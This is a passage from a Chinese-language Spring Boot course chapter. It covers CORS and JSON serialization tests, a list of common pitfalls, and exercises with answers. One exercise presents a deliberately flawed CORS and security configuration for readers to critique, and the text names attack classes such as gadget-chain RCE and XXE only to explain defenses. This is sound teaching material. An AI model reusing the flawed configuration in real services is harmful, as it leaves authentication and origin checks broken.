     * <p>★ 用 {@code YAMLMapper} 讀成 {@code JsonNode} —— 之後的欄位走訪
     * 完全不用改（YAML 與 JSON 在 Jackson 的樹模型裡是同一種東西）。
     */
    private com.fasterxml.jackson.databind.JsonNode fetchApiDocs() throws Exception {
        var yaml = new com.fasterxml.jackson.dataformat.yaml.YAMLMapper();
        try (var in = new org.springframework.core.io.ClassPathResource(
                "openapi/orders-api.yaml").getInputStream()) {
            return yaml.readTree(in);
        }
    }
}
```

### 6.10.4 CORS 的整合測試（真的 HTTP，不是 MockMvc）

⚠️ **MockMvc 對 CORS 的模擬有一個限制**：
它會執行 filter chain，所以 6.3.5 的 `CorsOnErrorResponsesTest` 是有效的。
**但它不會模擬瀏覽器的行為** —— 例如「瀏覽器會不會接受這個回應」。

```java
package example.shop.common.web;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.web.client.TestRestTemplate;
import org.springframework.http.*;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * CORS 的端到端測試（真的 socket）。
 *
 * <p>★ 為什麼除了 MockMvc 還需要這個：
 * <ul>
 *   <li>MockMvc 不經過 Servlet 容器 —— 有些標頭的行為（{@code Vary} 的多值、
 *       {@code setHeader(null)}）在容器上才會顯現（6.3.7）。</li>
 *   <li>OPTIONS 請求在 MockMvc 與真實容器上的處理路徑不完全相同。</li>
 * </ul>
 *
 * <p>⚠️ 但它仍然不是「瀏覽器測試」。真正驗證瀏覽器行為要用
 * Playwright / Cypress —— 而那屬於前端的測試範圍。
 * <b>後端能做到最好的是「回應的標頭符合規格」。</b>
 */
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
class CorsIntegrationTest {

    private static final String ORIGIN = "https://shop.example";

    @Autowired TestRestTemplate rest;

    @Test
    @DisplayName("preflight 的完整標頭")
    void preflight() {
        var headers = new HttpHeaders();
        headers.setOrigin(ORIGIN);
        headers.setAccessControlRequestMethod(HttpMethod.POST);
        headers.setAccessControlRequestHeaders(
                java.util.List.of("authorization", "content-type", "idempotency-key"));

        var response = rest.exchange("/orders", HttpMethod.OPTIONS,
                new HttpEntity<>(headers), Void.class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);

        var responseHeaders = response.getHeaders();
        assertThat(responseHeaders.getAccessControlAllowOrigin()).isEqualTo(ORIGIN);
        assertThat(responseHeaders.getAccessControlAllowCredentials()).isTrue();
        assertThat(responseHeaders.getAccessControlAllowMethods())
                .contains(HttpMethod.POST, HttpMethod.PATCH, HttpMethod.DELETE);
        // ★ Authorization 必須被明確允許（6.3.3 的 * 陷阱）
        assertThat(responseHeaders.getAccessControlAllowHeaders())
                .contains("Authorization");
        assertThat(responseHeaders.getAccessControlMaxAge()).isEqualTo(7200L);
        assertThat(responseHeaders.getVary()).contains("Origin");
    }

    @Test
    @DisplayName("★ Vary 有三個值（Spring 自動加的），而且沒被覆蓋")
    void vary的三個值() {
        var headers = new HttpHeaders();
        headers.setOrigin(ORIGIN);
        headers.setAccessControlRequestMethod(HttpMethod.GET);

        var response = rest.exchange("/orders", HttpMethod.OPTIONS,
                new HttpEntity<>(headers), Void.class);

        assertThat(response.getHeaders().getVary())
                .as("""
                    Vary 缺少某些值。Spring 的 DefaultCorsProcessor 會自動加三個：
                      Origin、Access-Control-Request-Method、Access-Control-Request-Headers

                    如果少了，最可能的原因是有人用 setHeader("Vary", ...)
                    覆蓋了它們（應該用 addHeader，6.3.7）。
                    """)
                .contains("Origin",
                          "Access-Control-Request-Method",
                          "Access-Control-Request-Headers");
    }

    @Test
    @DisplayName("★ 公開端點的 Allow-Origin 是 *（讓 CDN 能單一版本快取）")
    void 公開端點() {
        var headers = new HttpHeaders();
        headers.setOrigin("https://anyone.example");

        var response = rest.exchange("/products/P-1001", HttpMethod.GET,
                new HttpEntity<>(headers), String.class);

        assertThat(response.getHeaders().getAccessControlAllowOrigin()).isEqualTo("*");
        assertThat(response.getHeaders().getAccessControlAllowCredentials())
                .as("* 與 credentials 不可併用（6.2.2）")
                .isFalse();
        // ★ 6.3.7 的最佳化：* 的回應不需要 Vary: Origin
        assertThat(response.getHeaders().getVary())
                .as("Allow-Origin 是 * 時 Vary: Origin 沒有意義（會傷 CDN 命中率）")
                .doesNotContain("Origin");
    }

    @Test
    @DisplayName("★ preflight 不會被 TrailingSlashRedirectFilter 轉址（6.3.9）")
    void preflight不被轉址() {
        var headers = new HttpHeaders();
        headers.setOrigin(ORIGIN);
        headers.setAccessControlRequestMethod(HttpMethod.GET);

        var response = rest.exchange("/orders/", HttpMethod.OPTIONS,
                new HttpEntity<>(headers), Void.class);

        assertThat(response.getStatusCode())
                .as("""
                    preflight 收到了 3xx。

                    瀏覽器規格明確禁止 preflight 被轉址 ——
                    前端會看到「Redirect is not allowed for a preflight request」，
                    而錯誤訊息不會提到「多了一個斜線」（06 章 6.3.9）。

                    修法：TrailingSlashRedirectFilter 的 shouldNotFilter
                    要跳過 preflight 請求。
                    """)
                .isNotEqualTo(HttpStatus.PERMANENT_REDIRECT)
                .isNotEqualTo(HttpStatus.MOVED_PERMANENTLY);
    }
}
```

### 6.10.5 序列化的往返測試

```java
package example.shop.contract;

import com.fasterxml.jackson.databind.ObjectMapper;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;

import java.math.BigDecimal;
import java.time.Instant;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * 「序列化後再反序列化，值不變」的測試。
 *
 * <p>★★ 為什麼這個測試重要：
 * 客戶端常常做「GET 一個物件 → 改一個欄位 → PUT 回來」。
 * 如果序列化與反序列化不對稱，那個往返會<b>靜默地改變其他欄位</b>。
 *
 * <p>6.2.3 的對帳事故就是這一類：
 * {@code BigDecimal("1280.50")} 序列化成 {@code 1280.5}，
 * 反序列化回來變成 {@code BigDecimal("1280.5")}，
 * 而 {@code equals()} 說它們不同（6.5.7 的坑 2）。
 */
@SpringBootTest
class SerializationRoundTripTest {

    @Autowired ObjectMapper objectMapper;

    record TimeHolder(Instant value) {}
    record DecimalHolder(BigDecimal value) {}
    record TextHolder(String value) {}

    @Test
    @DisplayName("★ Instant 的往返：毫秒精度保持不變")
    void instant往返() throws Exception {
        // ⚠️ 輸入是奈秒精度，序列化會截斷到毫秒（6.5.6）
        var original = new TimeHolder(Instant.parse("2026-08-24T03:14:22.123456789Z"));

        String json = objectMapper.writeValueAsString(original);
        assertThat(json).isEqualTo("{\"value\":\"2026-08-24T03:14:22.123Z\"}");

        var restored = objectMapper.readValue(json, TimeHolder.class);
        // ★ 第一次往返會損失精度（奈秒 → 毫秒），這是預期的
        assertThat(restored.value()).isEqualTo(Instant.parse("2026-08-24T03:14:22.123Z"));

        // ★★ 但【第二次】往返必須完全不變 —— 這是「穩定性」的定義
        String json2 = objectMapper.writeValueAsString(restored);
        assertThat(json2).isEqualTo(json);
        assertThat(objectMapper.readValue(json2, TimeHolder.class)).isEqualTo(restored);
    }

    @Test
    @DisplayName("★ 整秒的 Instant 也有三位小數（避免字串排序與時間排序不一致）")
    void 整秒也有小數() throws Exception {
        var original = new TimeHolder(Instant.parse("2026-08-24T03:14:22Z"));
        String json = objectMapper.writeValueAsString(original);

        assertThat(json)
                .as("""
                    整秒的時間沒有 .000 —— 這會讓字串排序與時間排序不一致（6.5.6）：
                      "2026-08-24T03:14:22Z"     字串上 > "2026-08-24T03:14:22.100Z"
                      但時間上                     <
                    而 cursor 分頁如果用時間字串當游標，就會漏資料。
                    """)
                .isEqualTo("{\"value\":\"2026-08-24T03:14:22.000Z\"}");
    }

    @Test
    @DisplayName("★ BigDecimal 不用科學記號，而且往返穩定")
    void bigDecimal往返() throws Exception {
        for (String input : java.util.List.of(
                "1280.50", "1E+7", "0.001", "100.00", "-300.00", "1000000")) {

            var original = new DecimalHolder(new BigDecimal(input));
            String json = objectMapper.writeValueAsString(original);

            assertThat(json)
                    .as("BigDecimal(%s) 序列化後含科學記號", input)
                    .doesNotContainIgnoringCase("e+")
                    .doesNotContainIgnoringCase("e-");

            var restored = objectMapper.readValue(json, DecimalHolder.class);
            // ★ 用 compareTo 而不是 equals（scale 可能不同，6.5.7 的坑 2）
            assertThat(restored.value())
                    .as("BigDecimal(%s) 的往返改變了數值", input)
                    .usingComparator(BigDecimal::compareTo)
                    .isEqualTo(new BigDecimal(input));

            // ★★ 第二次往返完全穩定
            assertThat(objectMapper.writeValueAsString(restored)).isEqualTo(json);
        }
    }

    @Test
    @DisplayName("★ 中文不被 escape（回應更小、log 可讀）")
    void 中文不escape() throws Exception {
        var original = new TextHolder("訂單明細");
        String json = objectMapper.writeValueAsString(original);

        assertThat(json)
                .as("中文被 escape 成 \\uXXXX —— escape-non-ascii 被開啟了")
                .isEqualTo("{\"value\":\"訂單明細\"}");
    }

    @Test
    @DisplayName("★ emoji（surrogate pair）的往返")
    void emoji往返() throws Exception {
        // ⚠️ emoji 是 4 bytes 的 UTF-8 / 2 個 Java char（surrogate pair）——
        //    它是「字串長度」與「編碼」相關 bug 的經典觸發器
        var original = new TextHolder("訂單 🎉 完成");
        String json = objectMapper.writeValueAsString(original);
        var restored = objectMapper.readValue(json, TextHolder.class);

        assertThat(restored.value()).isEqualTo(original.value());
    }

    @Test
    @DisplayName("★ 反序列化接受多種時間格式（6.5.6 的寬容輸入）")
    void 寬容的時間輸入() throws Exception {
        var expected = Instant.parse("2026-08-24T03:14:22Z");

        for (String input : java.util.List.of(
                "\"2026-08-24T03:14:22Z\"",
                "\"2026-08-24T03:14:22.000Z\"",
                "\"2026-08-24T11:14:22+08:00\"",       // 帶偏移
                "1756005262",                           // epoch 秒
                "1756005262000")) {                     // epoch 毫秒

            var holder = objectMapper.readValue(
                    "{\"value\":" + input + "}", TimeHolder.class);
            assertThat(holder.value())
                    .as("輸入 %s 沒有被正確解析", input)
                    .isEqualTo(expected);
        }
    }

    @Test
    @DisplayName("★ 沒有時區的時間被【拒絕】（6.5.6 的界線）")
    void 拒絕沒有時區的時間() {
        org.assertj.core.api.Assertions.assertThatThrownBy(() ->
                        objectMapper.readValue(
                                "{\"value\":\"2026-08-24T03:14:22\"}", TimeHolder.class))
                .as("""
                    沒有時區的時間被接受了 —— 那讓伺服器猜時區，
                    而那正是 06 章 6.2.3 那個「對帳差 8 小時」的事故。
                    """)
                .isInstanceOf(com.fasterxml.jackson.databind.exc.InvalidFormatException.class)
                .hasMessageContaining("timezone");
    }
}
```

---

## 6.11 常見誤區

**誤區 1：「CORS 擋住了我的請求」**

6.3.1：對簡單請求，**請求已經送到伺服器並執行了**。
瀏覽器擋的是「讓 JavaScript 讀回應」。
所以 CORS 不能當成「防止未授權操作」的手段。

**誤區 2：「CORS 可以防 CSRF」**

6.3.8：CSRF 不需要讀回應。
HTML 表單能送 `application/x-www-form-urlencoded`（簡單請求）→ 不會 preflight。
防 CSRF 要靠「只接受 JSON」+「用 `Authorization` header 而不是 cookie」。

**誤區 3：「設了 `addCorsMappings` 就有 CORS 了」**

6.3.4：它在 `DispatcherServlet` 內生效，所以
**Spring Security 的 401/403、以及所有 Filter 產生的錯誤都沒有 CORS 標頭**。
症狀是「只有某些錯誤前端看不到」——而那正是最需要看到的那些。

**誤區 4：「`Access-Control-Allow-Headers: *` 涵蓋所有標頭」**

6.3.3：Fetch 規格明確排除 `Authorization`。
症狀是「preflight 回 200 但實際請求還是被擋」—— 極難查。

**誤區 5：「`Access-Control-Max-Age: 86400` 可以快取一天」**

6.3.2：Chrome 的上限是 **7200 秒**，超過的值被靜默夾取。
設 86400 只是誤導讀設定的人。

**誤區 6：「回應成功了，前端就能讀到所有標頭」**

6.3.3：跨來源請求預設只能讀七個標頭。
`Location`、`ETag`、`X-Trace-Id`、`Retry-After`、`Content-Disposition`
**全部要明確 expose**。
⚠️ **沒有 expose `X-Trace-Id`，04 章整套 traceId 機制在瀏覽器端就是廢的。**

**誤區 7：「`response.reset()` 只是清掉 body」**

6.3.5：它清掉**所有標頭**，包括 `CorsFilter` 已經設好的。
`ProblemWriter` 必須保存並復原它們。

**誤區 8：「`allowedOrigins` 寫了網域就會生效」**

6.3.6：**尾斜線**（`https://shop.example/`）永遠不會匹配 ——
`Origin` 標頭沒有路徑也沒有尾斜線。
而 `localhost` 與 `127.0.0.1` 是**不同的 origin**。

**誤區 9：「`Vary` 用 `setHeader` 加就好」**

6.3.7：那會清掉 Spring 自動加的三個值。要用 `addHeader`。

**誤區 10：「Boot 3 還支援 `/orders.json` 這種副檔名協商」**

6.4.3：Spring 6 已經**移除** `PathExtensionContentNegotiationStrategy`。
從 Boot 2 升級時 `/orders.json` 會變成 404。

**誤區 11：「`Accept: text/csv, application/json` 會回 JSON」**

6.4.1：q 值相同時**依 `Accept` 裡的出現順序**。
這會讓前端「意外拿到 CSV」，而後端完全沒改。
→ 有明確格式需求的端點一定要寫 `produces`。

**誤區 12：「`consumes = "application/json"` 保證是 UTF-8」**

6.4.2：Spring 的媒體型別比對**忽略參數**，
所以 `charset=Big5` 也會通過 → 中文變亂碼但不報錯 → **亂碼進資料庫**。

**誤區 13：「`configureMessageConverters` 是加 converter 的方法」**

6.4.5：它**完全取代**預設清單，會弄掉
`ResourceRegionHttpMessageConverter`（05 章 5.8.3 的 `Range` 支援）、
`ResourceHttpMessageConverter`（檔案下載）與 `StringHttpMessageConverter`。
**而 Range 失效不會報錯** —— 只是靜默回完整內容。
✅ 要用 `extendMessageConverters`。

**誤區 14：「`new ObjectMapper()` 只是少了一些設定」**

6.5.2：它缺 `JavaTimeModule`（`Instant` 變成 `{"seconds":...}`）、
缺 `StreamReadConstraints`（JSON 炸彈防護消失）、
缺 `non_null`、缺自訂 serializer。
**而它造成的「同一筆資料在不同端點格式不同」看起來像前端的 bug。**

**誤區 15：「加一個全域的 `BigDecimal` serializer 來處理金額」**

6.5.7：那會把「評分 4.5」與「重量 0.005」也格式化成兩位小數 ——
後者是 **100% 的精度損失**，而且是靜默的。
✅ 金額用 `String` 型別（型別上就不可能出錯）。

**誤區 16：「`stripTrailingZeros()` 把 100.00 變成 100」**

6.5.7：它產生**負的 scale**，然後 `toString()` 給你 `1E+2`。
✅ 永遠用 `setScale(2, HALF_UP)` + `toPlainString()`。

**誤區 17：「`BigDecimal.equals()` 比較數值」**

6.5.7：它比較 **scale**。`new BigDecimal("1280.50").equals(new BigDecimal("1280.5"))` 是 `false`。
✅ 用 `compareTo()`。
⚠️ 而 `record` 的自動 `equals()` 用的是 `BigDecimal.equals()`。

**誤區 18：「`LocalDateTime` 就是時間」**

6.5.6：它**沒有時區**。讀的人只能猜，而猜錯就是 6.2.3 的對帳事故。
✅ DTO 一律用 `Instant`。
⚠️ `ZonedDateTime` 的 `[Asia/Taipei]` 後綴**不是標準 ISO-8601**，JS 解析失敗。

**誤區 19：「`Instant.toString()` 的格式是固定的」**

6.5.6：小數是 0 時它**省略小數部分**。
所以同一個欄位有時 19 字元有時 24 字元 ——
而那會讓「用時間字串當 cursor」的分頁**漏資料**。

**誤區 20：「新增一個 enum 值是相容的變更」**

6.2.4：Swift 的 `Codable` 與 Android 的 Moshi 對未知 enum 值**拋例外**，
而那個例外發生在解析整個回應時 → **整個列表都拿不到**。
✅ 三個防護：`x-extensible-enum`、`statusLabel`、feature flag 控制上線。

**誤區 21：「`read-unknown-enum-values-using-default-value: true` 是好的預設」**

6.5.8：對「別人送來的 webhook」是對的，
對「我們自己 API 的查詢參數」是災難 ——
`?status=PARTIALY_SHIPPED`（打錯字）會變成 `UNKNOWN` → 查不到 →
使用者以為沒有訂單（04 章 4.2.3 的靜默篩選重演）。

**誤區 22：「`@JsonView` 可以取代多個 DTO」**

6.6.3：**忘記標 `@JsonView` 的欄位對所有 view 可見**（或全部不可見）。
差別是「權限」時一定用不同的 DTO —— 那樣編譯器會幫你。
差別只是「資料量」時 `@JsonView` 可以接受。

**誤區 23：「`ResponseBodyAdvice` 對所有回應生效」**

6.6.6：`StreamingResponseBody` 與 `SseEmitter` 走不同的 return value handler，
**完全不經過 advice**。
所以 `?fields=` 在串流端點會被**靜默忽略** —— 客戶端以為它成功了。

**誤區 24：「`ResponseBodyAdvice` 不會動到錯誤回應」**

6.6.4：它**會** —— `@ExceptionHandler` 的回傳值也走同一個 processor。
一個沒排除 `Problem` 的稀疏欄位 advice 會把錯誤回應裁成 `{}`。

**誤區 25：「`activateDefaultTyping` 只是讓多型方便」**

6.7.1：它讓 JSON 可以指定任意類別 → gadget chain → **遠端程式碼執行**。
Jackson 的黑名單永遠落後於新的 gadget。
✅ 用 `@JsonTypeInfo(use = Id.NAME)` + `@JsonSubTypes`（封閉集合）。

**誤區 26：「用了 DTO 就沒有 mass assignment 問題」**

6.7.2：`Map<String, Object>` 型別的欄位讓 `fail-on-unknown-properties` 失效。
`{"metadata": {"status": "PAID"}}` 會被吃下來。

**誤區 27：「Jackson 2.15 的預設 `StreamReadConstraints` 夠嚴」**

6.7.3：`maxStringLength` 的預設是 **20 MB**。
20 MB × 50 併發 = 1 GB heap。
而且它與 `api.limits.max-request-body-bytes`（1 MB）不一致 ——
寬的那個就是實際上限。

**誤區 28：「序列化失敗會回 500」**

6.7.4：回應超過緩衝區（約 8 KB）就已經 committed →
客戶端收到 **`200 OK` + 截斷的 JSON**，而且沒有 traceId。
✅ 靠 `DtoSerializabilityTest`（全 null 也能序列化）預防。

**誤區 29：「`ShallowEtagHeaderFilter` 加上去就有 ETag 了」**

6.8.1：它把整個回應緩衝到記憶體（**串流端點會 OOM**），
而且**伺服器的工作完全沒省**（只省傳輸）。
✅ 有版本欄位的資源自己算 ETag，還能做「快速 304」。

**誤區 30：「加了 `Cache-Control: private` 就不會被 CDN 快取」**

6.8.2：某些代理設定會忽略 `private`。
`Vary: Authorization` 是第二層，**兩層都要有**。
而讓 ETag 包含「表述識別」是第三層。

**誤區 31：「412 和 409 差不多」**

6.8.3：**412 = 重新取得資源再重試就能成功**（`If-Match` 不匹配）；
**409 = 那樣做還是不行**（狀態機不允許）。
回錯了客戶端的重試策略就是錯的。

**誤區 32：「兩個 filter 的 order 一樣沒關係」**

6.9.4：相同 order 的執行順序是**未定義**的（依 Spring 收集 bean 的順序）。
症狀是「同一份程式碼在不同機器上行為不同」或「升 patch 版本後突然壞了」。

---

## 6.12 本章練習

### 練習 1：找出這份 CORS 設定的 9 個問題

```java
@Configuration
public class CorsConfig implements WebMvcConfigurer {

    @Value("${app.frontend.url}")
    private String frontendUrl;

    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
                .allowedOrigins(frontendUrl, "http://localhost:3000")
                .allowedMethods("GET", "POST", "PUT", "DELETE")
                .allowedHeaders("*")
                .allowCredentials(true)
                .maxAge(86400);
    }

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        return http
                .authorizeHttpRequests(auth -> auth
                        .requestMatchers("/api/public/**").permitAll()
                        .anyRequest().authenticated())
                .build();
    }
}
```

```yaml
app:
  frontend:
    url: https://shop.example/
```

<details>
<summary>參考答案</summary>

**1. `allowedHeaders("*")` 不涵蓋 `Authorization`（High）**

6.3.3：Fetch 規格的明確例外。
症狀：preflight 回 200，實際請求被擋，錯誤訊息是
`Request header field authorization is not allowed by Access-Control-Allow-Headers`。

**修法**：明確列出 `Authorization` 與所有自訂標頭。

**2. `frontendUrl` 有尾斜線（High）**

6.3.6：`https://shop.example/` **永遠不會匹配** ——
`Origin` 標頭是 `https://shop.example`（沒有斜線）。

⚠️ 這一項最惡毒的地方是：**設定「看起來完全正確」**，
而錯誤訊息只說「CORS policy」。

**修法**：`CorsProperties` 的 `@Pattern` 驗證（6.3.5）+
`CorsConfigurationValidator` 的啟動檢查（6.3.6）。

**3. Security 沒有 `.cors()`（Critical）**

6.3.4：`addCorsMappings` 在 `DispatcherServlet` 內生效，
而 Security 在它之前。所以：

- preflight 的 `OPTIONS` 請求**沒有 `Authorization`** →
  被 `anyRequest().authenticated()` 擋掉 → 401 →
  瀏覽器報「Response to preflight request doesn't pass access control check」
- **所有需要認證的端點完全無法從瀏覽器呼叫**

**修法**：`.cors(Customizer.withDefaults())` + 一個 `CorsConfigurationSource` bean。

**4. 完全沒有 `exposedHeaders`（High）**

6.3.3：前端讀不到 `Location`、`ETag`、`X-Trace-Id`、`Retry-After`。

⚠️ 具體損失：
- 04 章的 traceId 機制在瀏覽器端**完全失效**
- 6.8.3 的樂觀鎖（需要讀 `ETag` 才能送 `If-Match`）**無法使用**
- 05 章 5.10.6 的 blob 下載拿不到檔名

**5. `maxAge(86400)` 超過 Chrome 的上限（Low）**

6.3.2：Chrome 夾成 7200。不是 bug，但誤導。

**6. 缺少 `PATCH` 與 `OPTIONS`（Medium）**

`allowedMethods` 只有 `GET, POST, PUT, DELETE`。
shop-service 的 `PATCH /orders/{id}` 會被擋。

⚠️ `OPTIONS` 其實不用列（`CorsFilter` 自己處理 preflight），
但列上去比較不容易讓人困惑。

**7. Filter 產生的錯誤沒有 CORS 標頭（High）**

6.2.1：即使修好第 3 點，`addCorsMappings` 仍然涵蓋不到
order < -100 的 filter 產生的回應（429、413、308）。

**修法**：獨立的 `CorsFilter`，order = -200（6.3.5）。

**8. `localhost:3000` 寫死在正式環境的設定裡（Medium）**

**兩個問題**：
- 正式環境允許一個 `http://` 的 origin（中間人可偽造回應）
- 而且它永遠不會被移除（沒有人敢刪「別人可能在用」的設定）

**修法**：用 profile 分開（6.3.5 的 `application-local.yml`），
並用 `CorsConfigurationValidator` 讓「prod 有 localhost」變成啟動失敗。

**9. `/api/**` 與實際的路徑不符（Medium）**

shop-service 的路徑是 `/orders`、`/products`（沒有 `/api` 前綴）。
這份設定實際上**什麼都沒套用到**。

⚠️ 這是一個「設定寫了但完全沒生效」的情況，而它沒有任何警告。

**加分：兩個設計問題**

**10. `@Value` 注入單一字串而不是 `@ConfigurationProperties`**

無法驗證、無法支援多個 origin、無法在啟動時檢查。

**11. `CorsConfig` 同時實作 `WebMvcConfigurer` 與定義 `SecurityFilterChain`**

兩個完全不同的關注點在同一個類別裡。
Security 的設定應該在 `SecurityConfig`。

**重寫版**：見 6.3.5 的 `CorsConfig` + `CorsProperties` +
`CorsConfigurationValidator`。

</details>

### 練習 2：預測這 12 種情況的回應

假設 shop-service 已按本章實作完成。

| # | 請求 | 狀態 | 說明 |
|---|---|---|---|
| 1 | `Accept: application/xml` 打 `GET /orders` | ? | ? |
| 2 | `Content-Type: application/xml` 打 `POST /orders` | ? | ? |
| 3 | `Content-Type: application/json;charset=Big5` 打 `POST /orders` | ? | ? |
| 4 | `POST /orders` body 是 `{"items":[],"quantiy":5}` | ? | ? |
| 5 | `GET /orders?status=paid`（小寫） | ? | ? |
| 6 | `GET /orders?status=PARTIALY_SHIPPED`（打錯字） | ? | ? |
| 7 | `PATCH /orders/ord_1` body 含 `"status": "PAID"` | ? | ? |
| 8 | `PATCH /orders/ord_1` 沒有 `If-Match` | ? | ? |
| 9 | `GET /orders/ord_1` 帶正確的 `If-None-Match` | ? | ? |
| 10 | `GET /orders.csv?fields=orderId` | ? | ? |
| 11 | `POST /orders/ord_1/payments` body 的 `paymentMethod.type` 是 `"APPLE_PAY"` | ? | ? |
| 12 | `GET /orders` 從 `Origin: https://evil.example` | ? | ? |

<details>
<summary>參考答案</summary>

| # | 狀態 | `code` | 說明 |
|---|---|---|---|
| 1 | **406** | `NOT_ACCEPTABLE` | `produces = application/json` 與 `Accept: application/xml` 無交集（6.4.2）。⚠️ 我們刻意不註冊 XML converter（6.4.3） |
| 2 | **415** | `UNSUPPORTED_MEDIA_TYPE` | `consumes` 不匹配。回應會列出 `supportedContentTypes`（05 章 5.6.2 的 advice） |
| 3 | **415** | `UNSUPPORTED_MEDIA_TYPE` | `JsonCharsetFilter`（order -117）擋掉（6.4.2）。⚠️ **沒有這個 filter 的話會是 201 + 亂碼進資料庫** |
| 4 | **400** | `MALFORMED_REQUEST` | `fail-on-unknown-properties: true` → `quantiy` 未知（6.5.5）。回應含「您是否想輸入 quantity？」（03 章 3.9.5）。⚠️ 不是 422 —— 反序列化階段就失敗了 |
| 5 | **422** | `VALIDATION_FAILED` | `accept-case-insensitive-enums: false` + `StrictStringToEnumConverterFactory`（6.5.8）。回應含 `suggestion: "PAID"` 與明確的 hint |
| 6 | **422** | `VALIDATION_FAILED` | 同上，`suggestion: "PARTIALLY_SHIPPED"`（Levenshtein 距離 1）。★ **不是「回空列表」** —— 那是 04 章 4.2.3 的靜默篩選災難 |
| 7 | **403** | `FORBIDDEN_PARAMETER` | `@ReadOnlyField` + `ReadOnlyFieldInterceptor`（6.5.5、6.9.3）。★ 不是 400（不是「不認識這個欄位」）也不是靜默忽略 |
| 8 | **428** | `IF_MATCH_REQUIRED` | RFC 6585 的 Precondition Required（6.8.3）。回應含 `howToObtain: "GET /orders/ord_1 的回應標頭 ETag"` |
| 9 | **304** | — | 快速 304：只查了 `version` 欄位（約 1.2 ms 而不是 18 ms）。⚠️ 回應**必須帶 ETag** 且**不可有 body**（6.8.2） |
| 10 | **400** | `UNKNOWN_PARAMETER` | `StreamingUnsupportedParamInterceptor`（6.6.6）。★ **不是 200 + 完整的 CSV** —— 那會讓客戶端以為它成功限制了欄位 |
| 11 | **400** | `MALFORMED_REQUEST` | `InvalidTypeIdException`（6.7.1）。回應的 `errors[0]` 含 `allowedValues: ["CREDIT_CARD","BANK_TRANSFER","COD"]`。⚠️ 我們刻意不設 `defaultImpl` |
| 12 | **403** | — | `CorsFilter` 對不允許的 origin 回 403 且**不呼叫 filter chain**（6.3.5）。★ 業務邏輯完全不執行，而且回應**沒有** `Access-Control-Allow-Origin` |

**四個容易答錯的**：

**#4 為什麼是 400 而不是 422？**

`fail-on-unknown-properties` 在**反序列化**階段就失敗了 ——
DTO 根本沒被建立出來，所以 Bean Validation 沒有機會執行。
「請求的格式不對」是 400。

⚠️ 對照 #5：那是「格式對（一個字串）但值不合法」→ 422。

**#7 為什麼是 403 而不是 400？**

如果沒有 `@ReadOnlyField`，`status` 就是一個未知欄位 → 400。
**但 400 的訊息是「不認識這個欄位」，那是誤導的** ——
我們認識它，只是不允許改。403 + `FORBIDDEN_PARAMETER` 才精確。

**#10 為什麼是 400 而不是「忽略那個參數」？**

因為靜默忽略是這門課反覆出現的災難模式：

| 章節 | 靜默忽略了什麼 | 後果 |
|---|---|---|
| 01 章 1.7.5 | `?statuss=PAID`（打錯字） | 使用者看到未篩選的全部訂單 |
| 04 章 4.2.3 | `?size=1000000` 被夾到 100 | 41 萬筆的報表少了 40.99 萬筆 |
| 06 章 6.5.5 | `{"quantiy": 5}` | 使用者買到 1 件而不是 5 件 |
| **06 章 6.6.6** | **`?fields=` 在串流端點** | **客戶端以為它省了頻寬** |

**#12 為什麼業務邏輯不執行？**

Spring 的 `CorsFilter` 對不允許的 origin 直接回 403 並**不呼叫 `chain.doFilter`**。
這比「執行了但瀏覽器擋住回應」好（6.3.1 的推論 ①）。

⚠️ **副作用**：非瀏覽器的客戶端如果不小心帶了 `Origin` 標頭也會被擋。
這值得寫在 API 文件裡。

</details>

### 練習 3：設計「支援 XML」的完整方案

**需求**：一個新的 B2B 合作夥伴（傳統 ERP 系統）只能處理 XML。
他們要用 `GET /orders` 與 `POST /orders`。

**請設計並回答**：

1. 用內容協商（`Accept: application/xml`）還是獨立的端點（`/xml/orders`）？
2. 需要加哪些依賴與設定？
3. **三個 XML 特有的安全問題**與防法。
4. `Problem`（錯誤格式）要怎麼處理？
5. 這個決定會影響哪些既有的測試？
6. 有沒有更好的替代方案？

<details>
<summary>參考答案</summary>

**0. 先問「有沒有更好的替代方案」（第 6 題先答）**

在寫任何程式碼之前，四個替代方案：

| 方案 | 說明 | 評估 |
|---|---|---|
| **A. 一個獨立的轉換服務** ★ | 合作夥伴打一個小的 adapter 服務，它呼叫我們的 JSON API 並轉成 XML | ✅ **最推薦** —— 我們的主服務完全不受影響 |
| B. 給他們一個 SDK | 我們提供一個 Java/C# 的 client library | ⚠️ 對「傳統 ERP」通常不可行（無法引入依賴） |
| C. 檔案交換（SFTP + XML） | 每小時一個批次檔 | ✅ 對 ERP 常常是**最自然**的方式 |
| D. 在主 API 支援 XML | 下面的完整設計 | ⚠️ 成本最高、風險最大 |

⚠️ **「一個合作夥伴的需求不該改變主 API 的表面」是一個重要的原則**。
XML 支援會讓**每一個** DTO 都需要考慮 XML 的序列化行為，
而 XML 的安全問題（XXE、entity expansion）是**全站**的攻擊面。

**如果評估後真的要做（例如這個夥伴佔營收 40%），以下是設計。**

**1. 獨立的端點，不用內容協商**

```
POST /partners/erp/v1/orders          （XML）
GET  /partners/erp/v1/orders          （XML）
```

**四個理由**：

| 理由 | 說明 |
|---|---|
| **攻擊面隔離** | XXE 的防護只需要套用在這幾個端點的 `XmlMapper` 上，而不是全站 |
| **不影響既有測試** | 6.10.3 的 `OpenApiConsistencyTest`、6.4.1 的 `produces` 都不用改 |
| **契約可以不同** | ERP 要的欄位與名稱和我們的 JSON API 本來就不同（他們有自己的欄位命名） |
| **可以獨立限流與監控** | 一個合作夥伴的批次匯入不該影響顧客的下單 |

⚠️ **如果用內容協商（`Accept: application/xml`）**：
`ContentNegotiationConfig`（6.4.3）要註冊 XML，
而那讓**所有 34 個 GET 端點**都變成「可能回 XML」——
包含那些回傳 `Map<String, Object>`、`Problem`、`PageResponse<T>` 的端點。
**XML 對泛型與 Map 的序列化很不友善**，而你要為每一個都測。

**2. 依賴與設定**

```xml
    <dependency>
      <groupId>com.fasterxml.jackson.dataformat</groupId>
      <artifactId>jackson-dataformat-xml</artifactId>
    </dependency>
```

